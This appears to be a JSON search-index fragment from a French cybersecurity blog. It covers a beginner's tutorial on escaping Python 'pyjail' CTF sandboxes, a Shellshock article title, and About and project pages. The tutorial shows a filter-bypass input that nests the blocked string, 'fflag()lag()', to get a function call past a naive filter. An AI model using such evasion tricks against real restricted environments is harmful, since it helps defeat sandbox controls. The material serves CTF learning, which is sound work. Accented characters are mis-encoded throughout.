","date":"2020-02-28","objectID":"/la-vuln%C3%A9rabilite-shellshock/:2:3","tags":["apache","article","bash","ctf","web"],"title":"La vuln√©rabilit√© Shellshock","uri":"/la-vuln%C3%A9rabilite-shellshock/"},{"categories":null,"content":"Introduction Tout d‚Äôabord qu‚Äôest-ce qu‚Äôune ‚Äòpyjail‚Äô ? Il s‚Äôagit le plus souvent d‚Äôun environnement Python üêç restreint, c‚Äôest-√†-dire que (comme pour les autres types de ‚Äòjails‚Äô) certaines fonctions, classes ont √©t√© supprim√©es, ou sont filtr√©es lors du traitement de l‚Äôinput utilisateur pour bloquer l‚Äôattaquant. Ces environnements restreints sont pr√©sents lors de CTFs mais c‚Äôest une cat√©gorie qui n√©cessite un peu de connaissances avant de s‚Äôy lancer, mais sont aussi utilis√©s dans des milieux professionnels afin d‚Äô√©viter de donner l‚Äôacc√®s √† tout le syst√®me si un attaquant arrive √† entrer sur un serveur SSH par exemple. ","date":"2019-03-09","objectID":"/les-pyjails-pour-les-d%C3%A9butants/:1:0","tags":["ctf","jail","python"],"title":"Les pyjails pour les d√©butants","uri":"/les-pyjails-pour-les-d%C3%A9butants/"},{"categories":null,"content":"Un peu de pratique Avec l‚Äôaide d‚Äôun cobaye pour le test, qui se reconna√Ætra, j‚Äôai r√©alis√© quelques pyjails qui permettent de mieux appr√©hender le langage Python, mais aussi de d√©velopper une m√©thodologie de r√©solution. Nous allons voir comment r√©soudre une jail des plus basiques ensemble, ensuite vous serez libres d‚Äôapprofondir vos connaissances avec d‚Äôautres jails que j‚Äôai r√©alis√©, et si le c≈ìur vous en dit vous pouvez m√™me tenter de flag les jails sur Root-Me üòä. ","date":"2019-03-09","objectID":"/les-pyjails-pour-les-d%C3%A9butants/:2:0","tags":["ctf","jail","python"],"title":"Les pyjails pour les d√©butants","uri":"/les-pyjails-pour-les-d%C3%A9butants/"},{"categories":null,"content":"Avant de commencer V√©rifiez bien d‚Äôavoir Python 3 d‚Äôinstall√© sur votre machine, puis t√©l√©chargez cette archive zip qui contient l‚Äôenvironnement de travail ad√©quat pour r√©soudre toutes les jails. Cette archive contient un fichier flag.txt qui est lu par toutes les jails lorsque vous avez r√©ussi le challenge, vous devez alors laisser les fichiers jail*.py dans le m√™me dossier. ","date":"2019-03-09","objectID":"/les-pyjails-pour-les-d%C3%A9butants/:2:1","tags":["ctf","jail","python"],"title":"Les pyjails pour les d√©butants","uri":"/les-pyjails-pour-les-d%C3%A9butants/"},{"categories":null,"content":"Pour d√©marrer Au pr√©alable, d√©compressez le fichier zip : mkdir jails; unzip jails.zip -d jails/; cd jails Pour lancer une jail de votre choix vous avez simplement √† l‚Äôex√©cuter avec Python : python3 jail1.py Note : les jails sont class√©es par difficult√© croissante, on a alors jail1 plus simple que jail3 ","date":"2019-03-09","objectID":"/les-pyjails-pour-les-d%C3%A9butants/:2:2","tags":["ctf","jail","python"],"title":"Les pyjails pour les d√©butants","uri":"/les-pyjails-pour-les-d%C3%A9butants/"},{"categories":null,"content":"Au boulot ! Passons √† la r√©alisation de la jail 1. Le but est de finir le challenge sans lire le code source du fichier, mais si vous √™tes bloqu√© plusieurs heures n‚Äôh√©sitez pas √† y jeter un coup d‚Äô≈ìil rapide. Premier lan√ßement Pour nous √©chapper de cette prison nous allons devoir √©tudier comment fonctionne le programme. On lance la jail1 : Tests Effectuons quelques tests afin de d√©terminer ce que l‚Äôon peut faire dans cet environement restreint : On peut voir que les op√©rations usuelles (calculs, affichage, variables‚Ä¶) sont autoris√©es, essayons sd‚Äôappeler la m√©thode flag() afin de sortir : Pas de chance, rien ne se passe, pourtant on voit bien que flag est une fonction, on devrait √™tre en mesure de l‚Äôapeller, comme pour print() par exemple. Il doit se passer quelque chose entre le moment o√π l‚Äôon entre la commande et l‚Äôex√©cution de cette derni√®re üòî. Essayons de d√©terminer le probl√®me : R√©solution On comprend alors que l‚Äôentr√©e utilisateur est filtr√©e : si la cha√Æne \"flag()\" est pr√©sente, elle est supprim√©e. Comment y rem√©dier ? Il existe une astuce moldave bien connue pour contourner ce filtre, vous connaissez le film Inception ? C‚Äôest le m√™me principe, sauf que c‚Äôest pas dans un r√™ve mais un shell Python. En effet, √©crire fflag()lag(), ou flag(flag()), ou toute autre variation permet de contourner le filtre. üéâüéâ ","date":"2019-03-09","objectID":"/les-pyjails-pour-les-d%C3%A9butants/:2:3","tags":["ctf","jail","python"],"title":"Les pyjails pour les d√©butants","uri":"/les-pyjails-pour-les-d%C3%A9butants/"},{"categories":null,"content":" French engineering student in cybersecurity, I like the web, reverse, crafting ELF and assembly. I participate in CTFs on my own or with friends. I mostly do the web challenge because this is the easiest when you begin in cybersecurity. üòá CTF InterIUT 2020 staff üèÅ Norzh CTF 2021 staff üß≠ FakeCTF staff üè¶ Why this website The first need of this blog was to help me to remind things as I learn them, and this is a great chance to share my knowledges with others! The idea is to present subjects linked with security, for all levels (beginner to more advanced). I started with common domains, and with time I will share more advanced intel as I learn them. MISC Twitter GitHub Root-Me | HacktTheBox | TryHackMe ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" For information I made a few projects, some are very interesting, and some are more for learning purposes or testing. I listed here the ones I am the more proud of, but you can get a more exhaustive list by looking here: https://github.com/OxNinja https://git.fakenews.sh ","date":"0001-01-01","objectID":"/projects/:0:0","tags":null,"title":"Projects","uri":"/projects/"},{"categories":null,"content":"CTF Kit (mirrored on Github) A CLI tool to automate CTF deployment. Focus on the challenges üö© ","date":"0001-01-01","objectID":"/projects/:1:0","tags":null,"title":"Projects","uri":"/projects/"},{"categories":null,"content":"SQLi lab A cybersecurity playground to test your üíâ SQL injection skills! ","date":"0001-01-01","objectID":"/projects/:2:0","tags":null,"title":"Projects","uri":"/projects/"},{"categories":null,"content":"MonSQL The French version of the famous MySQL üá´üá∑ üêß Linux build üêç Python package üíª PHP library ","date":"0001-01-01","objectID":"/projects/:3:0","tags":null,"title":"Projects","uri":"/projects/"},{"categories":null,"content":"Science in school docs French documentation websites about science in general, separated by classes and domains: üìê Mathematics üî≠ Physics (I talk about Kerbal Space Program too) Some more incomming such as hardware, chemistry, programing‚Ä¶ ","date":"0001-01-01","objectID":"/projects/:4:0","tags":null,"title":"Projects","uri":"/projects/"}]